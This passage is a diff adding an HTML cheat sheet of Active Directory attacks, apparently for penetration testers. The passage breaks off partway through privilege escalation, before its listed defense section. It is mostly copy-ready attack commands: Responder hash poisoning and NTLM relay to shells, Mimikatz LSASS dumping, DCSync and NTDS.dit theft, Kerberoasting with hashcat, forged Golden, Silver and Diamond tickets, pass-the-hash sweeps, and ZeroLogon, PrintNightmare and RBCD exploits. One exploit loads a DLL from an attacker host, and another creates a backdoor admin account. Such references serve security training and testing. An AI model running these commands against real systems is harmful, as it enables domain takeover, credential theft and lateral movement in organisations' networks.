@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Active Directory Attacks</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#0f0f0f;color:#e0e0e0;padding:1.5rem}
+.wrap{max-width:900px;margin:0 auto}
+h1{font-size:22px;font-weight:600;color:#fff;margin-bottom:4px}
+.subtitle{font-size:13px;color:#888;margin-bottom:1.5rem}
+.nav{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:1.5rem}
+.nav button{font-size:12px;padding:5px 13px;border-radius:20px;border:1px solid #333;background:#1a1a1a;color:#888;cursor:pointer;transition:all .15s}
+.nav button.active{background:#fff;color:#000;border-color:#fff}
+.section{display:none}.section.active{display:block}
+h2{font-size:16px;font-weight:600;color:#fff;margin-bottom:6px}
+p{font-size:13px;color:#888;line-height:1.6;margin-bottom:1rem}
+.card{background:#1a1a1a;border:1px solid #2a2a2a;border-radius:10px;padding:1rem 1.2rem;margin-bottom:12px}
+.atk-title{font-size:14px;font-weight:600;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px}
+.atk-sub{font-size:12px;color:#888;margin-bottom:10px;line-height:1.55}
+table{width:100%;font-size:12px;border-collapse:collapse;table-layout:fixed}
+th{text-align:left;font-weight:500;font-size:11px;color:#666;padding:6px 8px;border-bottom:1px solid #2a2a2a;text-transform:uppercase;letter-spacing:.04em}
+td{padding:7px 8px;border-bottom:1px solid #1e1e1e;color:#ccc;vertical-align:top;word-break:break-word;font-size:12px}
+tr:last-child td{border-bottom:none}
+tr:hover td{background:#1f1f1f}
+code{font-family:'JetBrains Mono','Fira Code','Courier New',monospace;font-size:11px;background:#252525;padding:1px 5px;border-radius:4px;color:#ccc}
+.mono{font-family:'JetBrains Mono','Fira Code','Courier New',monospace;font-size:11px;color:#aaa;line-height:2;background:#141414;border-radius:8px;padding:12px 14px;margin-top:8px;border:1px solid #222;overflow-x:auto;white-space:pre}
+.badge{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;white-space:nowrap}
+.crit{background:#3d0f0f;color:#ff6b6b}
+.high{background:#3d2a00;color:#ffaa44}
+.med{background:#0f2a3d;color:#44aaff}
+.low{background:#0f3d1a;color:#44cc66}
+.step-row{display:flex;gap:10px;align-items:flex-start;margin-bottom:9px}
+.step-num{min-width:22px;height:22px;border-radius:50%;background:#252525;border:1px solid #333;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:600;color:#888;flex-shrink:0;margin-top:1px}
+.step-body{font-size:12px;color:#999;line-height:1.6}
+.step-body strong{color:#ddd;font-weight:500}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+@media(max-width:550px){.grid2{grid-template-columns:1fr}}
+.label{font-size:11px;font-weight:600;color:#666;text-transform:uppercase;letter-spacing:.05em;margin-bottom:5px}
+.tag{font-size:11px;padding:2px 8px;border-radius:4px;border:1px solid #2a2a2a;color:#777;display:inline-block;margin:2px}
+.comment{color:#555}
+.kw{color:#c792ea}
+.str{color:#c3e88d}
+.fn{color:#82aaff}
+</style>
+</head>
+<body>
+<div class="wrap">
+<h1>Active Directory Attacks</h1>
+<div class="subtitle">Every major AD attack — how it works, the tools, the commands, and how to defend.</div>
+
+<div class="nav">
+  <button class="active" onclick="show('overview',this)">Overview</button>
+  <button onclick="show('recon',this)">Recon</button>
+  <button onclick="show('creds',this)">Credential attacks</button>
+  <button onclick="show('kerberos',this)">Kerberos attacks</button>
+  <button onclick="show('lateral',this)">Lateral movement</button>
+  <button onclick="show('privesc',this)">Privilege escalation</button>
+  <button onclick="show('persist',this)">Persistence</button>
+  <button onclick="show('acl',this)">ACL abuse</button>
+  <button onclick="show('trust',this)">Domain trusts</button>
+  <button onclick="show('defense',this)">Defense</button>
+</div>
+
+<!-- OVERVIEW -->
+<div id="overview" class="section active">
+  <h2>Attack categories at a glance</h2>
+  <div class="card" style="padding:0.5rem 0">
+    <table>
+      <tr><th style="width:170px">Attack</th><th style="width:75px">Severity</th><th style="width:110px">Goal</th><th>What it does</th></tr>
+      <tr><td>Kerberoasting</td><td><span class="badge high">High</span></td><td>Cred theft</td><td>Extract TGS hashes for service accounts and crack offline</td></tr>
+      <tr><td>AS-REP Roasting</td><td><span class="badge high">High</span></td><td>Cred theft</td><td>Get encrypted AS-REP for accounts with no pre-auth required</td></tr>
+      <tr><td>Pass-the-Hash</td><td><span class="badge crit">Critical</span></td><td>Lateral move</td><td>Reuse NTLM hash without knowing the plaintext password</td></tr>
+      <tr><td>Pass-the-Ticket</td><td><span class="badge crit">Critical</span></td><td>Lateral move</td><td>Inject stolen Kerberos ticket to impersonate a user</td></tr>
+      <tr><td>Golden Ticket</td><td><span class="badge crit">Critical</span></td><td>Persistence</td><td>Forge TGTs using KRBTGT hash — unlimited domain access forever</td></tr>
+      <tr><td>Silver Ticket</td><td><span class="badge high">High</span></td><td>Persistence</td><td>Forge service tickets using a service account hash</td></tr>
+      <tr><td>DCSync</td><td><span class="badge crit">Critical</span></td><td>Cred theft</td><td>Impersonate DC to pull all password hashes from AD</td></tr>
+      <tr><td>LLMNR/NBT-NS Poisoning</td><td><span class="badge high">High</span></td><td>Cred theft</td><td>Poison name resolution to capture NTLMv2 hashes</td></tr>
+      <tr><td>NTLM Relay</td><td><span class="badge crit">Critical</span></td><td>Lateral move</td><td>Relay captured NTLM auth to another machine for shell access</td></tr>
+      <tr><td>Overpass-the-Hash</td><td><span class="badge crit">Critical</span></td><td>Lateral move</td><td>Convert NTLM hash into a Kerberos TGT</td></tr>
+      <tr><td>BloodHound recon</td><td><span class="badge med">Medium</span></td><td>Recon</td><td>Map attack paths to Domain Admin via graph analysis</td></tr>
+      <tr><td>Skeleton Key</td><td><span class="badge crit">Critical</span></td><td>Persistence</td><td>Patch DC in memory — every account accepts a master password</td></tr>
+      <tr><td>DCShadow</td><td><span class="badge crit">Critical</span></td><td>Persistence</td><td>Register rogue DC to push arbitrary AD changes silently</td></tr>
+      <tr><td>NTDS.dit extraction</td><td><span class="badge crit">Critical</span></td><td>Cred theft</td><td>Dump entire AD password database from the DC</td></tr>
+      <tr><td>ACL abuse</td><td><span class="badge high">High</span></td><td>Privesc</td><td>Exploit misconfigured object permissions to escalate or pivot</td></tr>
+      <tr><td>Unconstrained delegation</td><td><span class="badge crit">Critical</span></td><td>Privesc</td><td>Steal TGTs from any user that authenticates to a compromised host</td></tr>
+      <tr><td>Constrained delegation (S4U)</td><td><span class="badge high">High</span></td><td>Privesc</td><td>Impersonate any user to specific services using S4U2Proxy</td></tr>
+      <tr><td>RBCD</td><td><span class="badge high">High</span></td><td>Privesc</td><td>Abuse resource-based delegation to get SYSTEM on a machine</td></tr>
+      <tr><td>GPO abuse</td><td><span class="badge high">High</span></td><td>Privesc</td><td>Write to a GPO that applies to privileged machines or users</td></tr>
+      <tr><td>PrintNightmare</td><td><span class="badge crit">Critical</span></td><td>RCE/Privesc</td><td>Abuse Print Spooler to get SYSTEM on DCs (CVE-2021-1675)</td></tr>
+      <tr><td>ZeroLogon</td><td><span class="badge crit">Critical</span></td><td>Full compromise</td><td>Reset DC machine account password with zero auth (CVE-2020-1472)</td></tr>
+      <tr><td>Domain trust abuse</td><td><span class="badge high">High</span></td><td>Escalation</td><td>Pivot from child domain to parent/forest root via trust keys</td></tr>
+      <tr><td>SID history injection</td><td><span class="badge crit">Critical</span></td><td>Privesc</td><td>Inject privileged SIDs into SID history for silent escalation</td></tr>
+      <tr><td>AdminSDHolder abuse</td><td><span class="badge high">High</span></td><td>Persistence</td><td>Backdoor AdminSDHolder template for persistent DA-level access</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- RECON -->
+<div id="recon" class="section">
+  <h2>Reconnaissance</h2>
+  <p>Before attacking, enumerate users, groups, computers, trusts, SPNs, and permissions. Most recon uses legitimate AD queries — nearly indistinguishable from normal admin activity.</p>
+
+  <div class="card">
+    <div class="atk-title">BloodHound / SharpHound <span class="badge med">Medium</span></div>
+    <div class="atk-sub">Maps the entire AD environment as a graph. Finds shortest paths to Domain Admin through group memberships, sessions, ACLs, and delegation settings. The single most impactful recon tool in AD.</div>
+    <div class="label">Commands</div>
+    <div class="mono"><span class="comment"># SharpHound collector (run on domain-joined machine)</span>
+SharpHound.exe -c All
+SharpHound.exe -c All --stealth
+SharpHound.exe -c All,GPOLocalGroup --zipfilename results.zip
+
+<span class="comment"># Remote collection (Linux)</span>
+bloodhound-python -u user -p pass -d domain.local -ns 10.10.10.1 -c All
+
+<span class="comment"># In BloodHound GUI — pre-built queries:</span>
+"Find Shortest Paths to Domain Admins"
+"Find all Kerberoastable Users"
+"Find Principals with DCSync Rights"
+"Shortest Paths to Unconstrained Delegation Systems"
+"Find Computers where Domain Users are Local Admin"</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">PowerView / AD module enumeration</div>
+    <div class="mono"><span class="comment"># Domain info</span>
+Get-NetDomain
+Get-NetDomainController
+
+<span class="comment"># Users</span>
+Get-NetUser | select samaccountname,description,pwdlastset
+Get-NetUser -SPN                          <span class="comment"># Kerberoastable accounts</span>
+Get-NetUser -PreauthNotRequired           <span class="comment"># AS-REP roastable</span>
+
+<span class="comment"># Groups</span>
+Get-NetGroup "Domain Admins" -Recurse
+Get-NetLocalGroupMember -ComputerName dc.domain.local
+
+<span class="comment"># Computers</span>
+Get-NetComputer -OperatingSystem "*Server*"
+Find-LocalAdminAccess                     <span class="comment"># Where do I have local admin?</span>
+
+<span class="comment"># GPOs</span>
+Get-NetGPO
+Get-NetGPOGroup
+
+<span class="comment"># Native Windows commands</span>
+net user /domain
+net group "Domain Admins" /domain
+nltest /domain_trusts
+whoami /groups</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">LDAP enumeration</div>
+    <div class="atk-sub">LDAP often allows anonymous or low-privileged queries revealing all users, groups, computers, and policies in the domain.</div>
+    <div class="mono"><span class="comment"># ldapsearch</span>
+ldapsearch -x -H ldap://10.10.10.1 -b "dc=domain,dc=local" "(objectClass=user)"
+ldapsearch -x -H ldap://10.10.10.1 -b "dc=domain,dc=local" "(objectClass=group)"
+
+<span class="comment"># enum4linux-ng (full enumeration)</span>
+enum4linux-ng -A 10.10.10.1
+
+<span class="comment"># CrackMapExec</span>
+cme ldap 10.10.10.1 -u user -p pass --users
+cme ldap 10.10.10.1 -u user -p pass --groups
+cme ldap 10.10.10.1 -u user -p pass --password-not-required
+cme ldap 10.10.10.1 -u user -p pass --admin-count
+
+<span class="comment"># Enumerate SPNs for Kerberoasting</span>
+setspn -T domain.local -Q */*
+GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1</div>
+  </div>
+</div>
+
+<!-- CREDENTIAL ATTACKS -->
+<div id="creds" class="section">
+  <h2>Credential attacks</h2>
+
+  <div class="card">
+    <div class="atk-title">LLMNR / NBT-NS Poisoning <span class="badge high">High</span></div>
+    <div class="atk-sub">When Windows fails DNS resolution, it falls back to LLMNR (port 5355) and NBT-NS (port 137) broadcasts. Responder answers those broadcasts and captures NTLMv2 hashes from every machine on the subnet trying to resolve a name.</div>
+    <div class="step-row"><div class="step-num">1</div><div class="step-body"><strong>Victim</strong> tries to reach \\FILESERVER — DNS fails, broadcasts LLMNR query</div></div>
+    <div class="step-row"><div class="step-num">2</div><div class="step-body"><strong>Responder</strong> replies "I am FILESERVER" to the broadcast</div></div>
+    <div class="step-row"><div class="step-num">3</div><div class="step-body">Victim sends <strong>NTLMv2 challenge-response</strong> to authenticate to the fake server</div></div>
+    <div class="step-row"><div class="step-num">4</div><div class="step-body">Hash captured — crack offline or relay to another machine for immediate shell</div></div>
+    <div class="mono"><span class="comment"># Run Responder</span>
+sudo responder -I eth0 -wrf
+
+<span class="comment"># Crack captured NTLMv2 hash (hashcat mode 5600)</span>
+hashcat -m 5600 hashes.txt rockyou.txt --force
+
+<span class="comment"># Or relay instead of cracking (ntlmrelayx)</span>
+ntlmrelayx.py -tf targets.txt -smb2support
+ntlmrelayx.py -tf targets.txt -smb2support -i        <span class="comment"># interactive SMB shell</span>
+ntlmrelayx.py -tf targets.txt -smb2support -c "cmd"  <span class="comment"># execute command</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Password spraying <span class="badge high">High</span></div>
+    <div class="atk-sub">Try one password against many users. Avoids lockout by staying below the threshold (typically 3–5 bad attempts). Most effective with seasonal passwords: Winter2024!, Company@2024, Welcome1.</div>
+    <div class="mono"><span class="comment"># CrackMapExec — spray over SMB</span>
+cme smb 10.10.10.0/24 -u users.txt -p 'Winter2024!' --continue-on-success
+
+<span class="comment"># Kerbrute — faster, uses Kerberos (less lockout risk)</span>
+kerbrute passwordspray -d domain.local users.txt 'Winter2024!'
+
+<span class="comment"># Username enumeration first</span>
+kerbrute userenum -d domain.local /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">LSASS credential dumping <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">LSASS caches plaintext passwords (on older systems), NTLM hashes, and Kerberos tickets in memory. Mimikatz reads directly from the LSASS process.</div>
+    <div class="mono"><span class="comment"># Mimikatz — dump all cached credentials</span>
+privilege::debug
+sekurlsa::logonpasswords          <span class="comment"># plaintext + NTLM + Kerberos</span>
+sekurlsa::msv                     <span class="comment"># NTLM hashes only</span>
+sekurlsa::wdigest                 <span class="comment"># plaintext (if WDigest enabled)</span>
+sekurlsa::tickets /export         <span class="comment"># export Kerberos tickets</span>
+
+<span class="comment"># Dump LSASS memory via ProcDump (then parse offline)</span>
+procdump.exe -accepteula -ma lsass.exe lsass.dmp
+<span class="comment"># On attacker machine:</span>
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonpasswords
+
+<span class="comment"># Task Manager → right-click lsass.exe → Create dump file</span>
+<span class="comment"># CrackMapExec</span>
+cme smb 10.10.10.1 -u admin -p pass -M lsassy</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">DCSync <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Mimics a legitimate DC replication request. Pulls any account's password hash from AD without touching NTDS.dit on disk. Requires "Replicating Directory Changes" permission (held by DAs and delegated accounts).</div>
+    <div class="mono"><span class="comment"># Mimikatz — pull specific account hash</span>
+lsadump::dcsync /user:krbtgt
+lsadump::dcsync /user:Administrator
+lsadump::dcsync /all /csv         <span class="comment"># dump everything</span>
+
+<span class="comment"># Secretsdump (remote, no agent needed)</span>
+secretsdump.py domain/admin:pass@dc.domain.local
+secretsdump.py -hashes :NTLMhash domain/admin@dc.domain.local
+secretsdump.py -just-dc-ntlm domain/admin:pass@dc.domain.local</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">NTDS.dit extraction <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">NTDS.dit on the DC is the entire AD database — every account, every hash. Locked while running, but extractable via Volume Shadow Copies. Then parse offline with secretsdump.</div>
+    <div class="mono"><span class="comment"># Create shadow copy (on DC as admin)</span>
+vssadmin create shadow /for=C:
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\loot\
+reg save HKLM\SYSTEM C:\loot\SYSTEM
+reg save HKLM\SECURITY C:\loot\SECURITY
+
+<span class="comment"># Parse offline</span>
+secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL
+
+<span class="comment"># CrackMapExec (automated)</span>
+cme smb dc.domain.local -u admin -p pass --ntds</div>
+  </div>
+</div>
+
+<!-- KERBEROS -->
+<div id="kerberos" class="section">
+  <h2>Kerberos attacks</h2>
+
+  <div class="card">
+    <div class="atk-title">Kerberoasting <span class="badge high">High</span></div>
+    <div class="atk-sub">Any domain user can request a TGS (service ticket) for any SPN. The TGS is encrypted with the service account's hash. Request it, extract it, crack offline — completely normal AD behavior, minimal logging.</div>
+    <div class="step-row"><div class="step-num">1</div><div class="step-body">Find accounts with SPNs (service principal names) set</div></div>
+    <div class="step-row"><div class="step-num">2</div><div class="step-body">Request TGS for those accounts — any domain user can do this</div></div>
+    <div class="step-row"><div class="step-num">3</div><div class="step-body">Extract the encrypted TGS blob (RC4 or AES encrypted)</div></div>
+    <div class="step-row"><div class="step-num">4</div><div class="step-body">Crack the hash offline with hashcat using a wordlist</div></div>
+    <div class="mono"><span class="comment"># Impacket</span>
+GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request
+GetUserSPNs.py domain.local/user:pass -dc-ip 10.10.10.1 -request -outputfile hashes.txt
+
+<span class="comment"># Rubeus (on Windows)</span>
+Rubeus.exe kerberoast /outfile:hashes.txt
+Rubeus.exe kerberoast /user:svcSQL /nowrap
+Rubeus.exe kerberoast /rc4opsec           <span class="comment"># request only RC4 (faster crack)</span>
+
+<span class="comment"># Crack (hashcat)</span>
+hashcat -m 13100 hashes.txt rockyou.txt                    <span class="comment"># RC4</span>
+hashcat -m 19700 hashes.txt rockyou.txt                    <span class="comment"># AES-256</span>
+hashcat -m 13100 hashes.txt rockyou.txt -r best64.rule     <span class="comment"># with rules</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">AS-REP Roasting <span class="badge high">High</span></div>
+    <div class="atk-sub">Accounts with "Do not require Kerberos preauthentication" enabled respond to unauthenticated AS-REQ with an encrypted blob. No valid credentials needed to ask. Blob is crackable offline.</div>
+    <div class="mono"><span class="comment"># Impacket (no creds needed)</span>
+GetNPUsers.py domain.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.1
+
+<span class="comment"># With creds — find all vulnerable accounts</span>
+GetNPUsers.py domain.local/user:pass -dc-ip 10.10.10.1 -request
+
+<span class="comment"># Rubeus</span>
+Rubeus.exe asreproast /nowrap
+Rubeus.exe asreproast /user:targetuser /nowrap
+
+<span class="comment"># Crack (hashcat mode 18200)</span>
+hashcat -m 18200 asrep.txt rockyou.txt
+hashcat -m 18200 asrep.txt rockyou.txt -r best64.rule</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Pass-the-Ticket (PtT) <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Steal a Kerberos TGT or TGS from LSASS memory and inject it into your own session. You become the user — no password needed, ticket is already valid.</div>
+    <div class="mono"><span class="comment"># Export all tickets from memory (Mimikatz)</span>
+sekurlsa::tickets /export          <span class="comment"># saves .kirbi files</span>
+
+<span class="comment"># Inject ticket into current session</span>
+kerberos::ptt Administrator@domain.local.kirbi
+
+<span class="comment"># Rubeus — dump and inject</span>
+Rubeus.exe dump /luid:0x3e4 /nowrap
+Rubeus.exe ptt /ticket:base64encodedticket
+
+<span class="comment"># Verify ticket is loaded</span>
+klist</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Overpass-the-Hash (OPtH) <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Use an NTLM hash to get a full Kerberos TGT. Converts NTLM auth to Kerberos — more stealthy in environments that log NTLM usage.</div>
+    <div class="mono"><span class="comment"># Mimikatz</span>
+sekurlsa::pth /user:admin /domain:domain.local /ntlm:NTLMhash /run:powershell.exe
+
+<span class="comment"># Rubeus — get TGT directly and inject</span>
+Rubeus.exe asktgt /user:admin /rc4:NTLMhash /domain:domain.local /ptt
+Rubeus.exe asktgt /user:admin /aes256:AEShash /domain:domain.local /ptt</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Golden Ticket <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Forge any TGT for any user after obtaining the KRBTGT hash. Valid for 10 years by default. Survives all regular user/admin password resets. The endgame of domain compromise.</div>
+    <div class="step-row"><div class="step-num">1</div><div class="step-body">Get KRBTGT hash via DCSync: <code>lsadump::dcsync /user:krbtgt</code></div></div>
+    <div class="step-row"><div class="step-num">2</div><div class="step-body">Get Domain SID: <code>whoami /user</code> — strip the last RID</div></div>
+    <div class="step-row"><div class="step-num">3</div><div class="step-body">Forge the ticket with Mimikatz and inject it</div></div>
+    <div class="step-row"><div class="step-num">4</div><div class="step-body">Access any resource in the domain as any user</div></div>
+    <div class="mono"><span class="comment"># Mimikatz</span>
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:KRBTGThash /ptt
+
+<span class="comment"># Impacket (Linux)</span>
+ticketer.py -nthash KRBTGThash -domain-sid S-1-5-21-... -domain domain.local Administrator
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass domain.local/Administrator@dc.domain.local
+
+<span class="comment"># With extra SIDs (for forest escalation)</span>
+kerberos::golden /user:Administrator /domain:child.local /sid:S-1-5-21-childSID /krbtgt:hash /sids:S-1-5-21-rootSID-519 /ptt</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Silver Ticket <span class="badge high">High</span></div>
+    <div class="atk-sub">Forge a TGS for a specific service using that service account's hash. More targeted than Golden Ticket. Never touches the DC — no KDC logging at all.</div>
+    <div class="mono"><span class="comment"># Forge CIFS ticket for fileserver (SMB access)</span>
+kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:fileserver.domain.local /service:cifs /rc4:ServiceNTLMhash /ptt
+
+<span class="comment"># Common service targets:</span>
+<span class="comment"># cifs     → file shares (SMB)</span>
+<span class="comment"># http     → web services / IIS</span>
+<span class="comment"># host     → remote management (WMI, PsExec)</span>
+<span class="comment"># ldap     → AD queries (DCSync without DA!)</span>
+<span class="comment"># mssql    → SQL Server</span></div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Diamond Ticket <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Stealthier Golden Ticket variant. Requests a real TGT from the KDC, then decrypts and modifies it in memory — the ticket carries a valid KDC signature, defeating PAC validation detections.</div>
+    <div class="mono"><span class="comment"># Rubeus</span>
+Rubeus.exe diamond /krbkey:AES256key /user:lowpriv /password:pass /enctype:aes /ticketuser:Administrator /domain:domain.local /dc:dc.domain.local /ptt</div>
+  </div>
+</div>
+
+<!-- LATERAL MOVEMENT -->
+<div id="lateral" class="section">
+  <h2>Lateral movement</h2>
+
+  <div class="card">
+    <div class="atk-title">Pass-the-Hash (PtH) <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">NTLM authentication accepts a hash directly — the protocol never requires the plaintext password. Dump one hash, authenticate everywhere that account has access.</div>
+    <div class="mono"><span class="comment"># CrackMapExec — sweep entire subnet with one hash</span>
+cme smb 10.10.10.0/24 -u Administrator -H NTLMhash
+cme smb 10.10.10.0/24 -u Administrator -H NTLMhash --continue-on-success
+
+<span class="comment"># Execution methods (Impacket)</span>
+psexec.py  -hashes :NTLMhash domain/Administrator@10.10.10.1  <span class="comment"># creates service</span>
+wmiexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1  <span class="comment"># WMI — less noisy</span>
+smbexec.py -hashes :NTLMhash domain/Administrator@10.10.10.1  <span class="comment"># no binary dropped</span>
+atexec.py  -hashes :NTLMhash domain/Administrator@10.10.10.1 "whoami"
+
+<span class="comment"># Mimikatz spawn shell</span>
+sekurlsa::pth /user:admin /domain:domain.local /ntlm:hash /run:cmd.exe</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">NTLM Relay <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Capture NTLM authentication from Responder/LLMNR poisoning and relay it in real-time to another target. If the relayed account has admin there — instant code execution without cracking anything.</div>
+    <div class="step-row"><div class="step-num">1</div><div class="step-body">Disable SMB/HTTP on attacker machine (Responder.conf: SMB=Off, HTTP=Off)</div></div>
+    <div class="step-row"><div class="step-num">2</div><div class="step-body">Run <code>ntlmrelayx</code> pointing at targets where SMB signing is disabled</div></div>
+    <div class="step-row"><div class="step-num">3</div><div class="step-body">Run <code>responder</code> to poison broadcasts — victim's auth flows to attacker</div></div>
+    <div class="step-row"><div class="step-num">4</div><div class="step-body">ntlmrelayx forwards auth to target → shell or SAM dump</div></div>
+    <div class="mono"><span class="comment"># Find hosts without SMB signing (relay targets)</span>
+cme smb 10.10.10.0/24 --gen-relay-list targets.txt
+
+<span class="comment"># Run relay</span>
+ntlmrelayx.py -tf targets.txt -smb2support
+ntlmrelayx.py -tf targets.txt -smb2support -i          <span class="comment"># interactive shell</span>
+ntlmrelayx.py -tf targets.txt -smb2support -c "whoami" <span class="comment"># run command</span>
+ntlmrelayx.py -tf targets.txt --delegate-access        <span class="comment"># RBCD attack</span>
+
+<span class="comment"># Responder (SMB/HTTP off — just capture, don't respond)</span>
+sudo responder -I eth0 -wrf</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Remote execution methods <span class="badge high">High</span></div>
+    <div class="mono"><span class="comment"># WinRM (port 5985/5986) — most common</span>
+evil-winrm -i 10.10.10.1 -u admin -p pass
+evil-winrm -i 10.10.10.1 -u admin -H NTLMhash
+
+<span class="comment"># PSExec (creates a service — noisy)</span>
+PsExec.exe \\target -u domain\admin -p pass cmd.exe
+psexec.py domain/admin:pass@10.10.10.1
+
+<span class="comment"># WMI (stealthier)</span>
+wmiexec.py domain/admin:pass@10.10.10.1
+wmic /node:10.10.10.1 /user:admin /password:pass process call create "cmd.exe /c whoami"
+
+<span class="comment"># RDP</span>
+xfreerdp /u:admin /p:pass /v:10.10.10.1 +clipboard</div>
+  </div>
+</div>
+
+<!-- PRIVILEGE ESCALATION -->
+<div id="privesc" class="section">
+  <h2>Privilege escalation</h2>
+
+  <div class="card">
+    <div class="atk-title">ZeroLogon — CVE-2020-1472 <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Cryptographic flaw in Netlogon's AES-CFB8 implementation. An 8-byte all-zero IV causes ~1-in-256 encryptions to produce all-zero output. Allows resetting the DC machine account password with no credentials — instant full domain compromise.</div>
+    <div class="mono"><span class="comment"># Check if vulnerable</span>
+zerologon_tester.py DCNAME 10.10.10.1
+
+<span class="comment"># Exploit (resets DC machine account password to empty)</span>
+cve-2020-1472-exploit.py DCNAME 10.10.10.1
+
+<span class="comment"># DCSync with empty password</span>
+secretsdump.py -just-dc -no-pass domain/DCNAME\$@10.10.10.1
+
+<span class="comment"># RESTORE after exploitation (critical — DC will break otherwise)</span>
+reinstatepassword.py domain/admin:pass@10.10.10.1 DCNAME machine_account_hash</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">PrintNightmare — CVE-2021-1675 / CVE-2021-34527 <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Windows Print Spooler allows low-privileged users to install printer drivers, which run as SYSTEM. Exploitable locally (LPE) and remotely (RCE). Devastating on DCs where Spooler is running.</div>
+    <div class="mono"><span class="comment"># Remote RCE (as SYSTEM on DC)</span>
+CVE-2021-1675.py domain/user:pass@dc.domain.local '\\attackerIP\share\evil.dll'
+
+<span class="comment"># Local privilege escalation</span>
+Import-Module .\CVE-2021-34527.ps1
+Invoke-Nightmare -NewUser "backdoor" -NewPassword "Back@123"
+
+<span class="comment"># Check if vulnerable</span>
+cme smb 10.10.10.1 -u user -p pass -M printnightmare</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Unconstrained delegation abuse <span class="badge crit">Critical</span></div>
+    <div class="atk-sub">Machines with unconstrained delegation cache the TGT of every user that authenticates to them. Compromise such a machine, then use PrinterBug/PetitPotam to force DC authentication — steal DC's TGT — DCSync — full domain.</div>
+    <div class="mono"><span class="comment"># Find machines with unconstrained delegation</span>
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+<span class="comment"># Force DC to authenticate to your compromised machine</span>
+<span class="comment"># SpoolSample (PrinterBug)</span>
+SpoolSample.exe dc.domain.local compromised.domain.local
+<span class="comment"># PetitPotam</span>
+PetitPotam.py compromised.domain.local dc.domain.local
+
+<span class="comment"># Monitor for incoming TGTs on compromised machine</span>
+Rubeus.exe monitor /interval:5 /nowrap
+
+<span class="comment"># Inject captured DC TGT and run DCSync</span>
+Rubeus.exe ptt /ticket:base64ticket
+lsadump::dcsync /user:krbtgt</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">Constrained delegation (S4U) abuse <span class="badge high">High</span></div>
+    <div class="atk-sub">Service accounts with constrained delegation can use S4U2Self + S4U2Proxy to request tickets impersonating any user to allowed services — including Domain Admin.</div>
+    <div class="mono"><span class="comment"># Find constrained delegation accounts</span>
+Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+Get-ADComputer -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
+
+<span class="comment"># Rubeus S4U2 full chain</span>
+Rubeus.exe s4u /user:svcAccount /rc4:NTLMhash /impersonateuser:Administrator /msdsspn:cifs/server.domain.local /ptt
+
+<span class="comment"># Impacket</span>
+getST.py -spn cifs/server.domain.local -impersonate Administrator domain.local/svcAccount:pass</div>
+  </div>
+
+  <div class="card">
+    <div class="atk-title">RBCD — Resource-Based Constrained Delegation <span class="badge high">High</span></div>
+    <div class="atk-sub">If you can write the msDS-AllowedToActOnBehalfOfOtherIdentity attribute on a computer object (via GenericWrite, GenericAll, WriteDACL), you can make that computer trust a fake machine account you control — then impersonate any user to it.</div>
+    <div class="mono"><span class="comment"># Add fake computer account (any user can add up to 10 by default)</span>
+addcomputer.py -computer-name 'FakePC$' -computer-pass 'Fake@123' domain.local/user:pass
+
+<span class="comment"># Write RBCD attribute on target computer</span>
+rbcd.py -f FakePC -t target -dc-ip 10.10.10.1 domain.local/user:pass
+
+<span class="comment"># Get impersonated service ticket</span>
+getST.py -spn cifs/target.domain.local -impersonate Administrator domain.local/FakePC\$:Fake@123
+
+<span class="comment"># Use ticket</span>
+export KRB5CCNAME=Administrator.ccache
+psexec.py -k -no-pass domain.local/Administrator@target.domain.local</div>
+  </div>
+
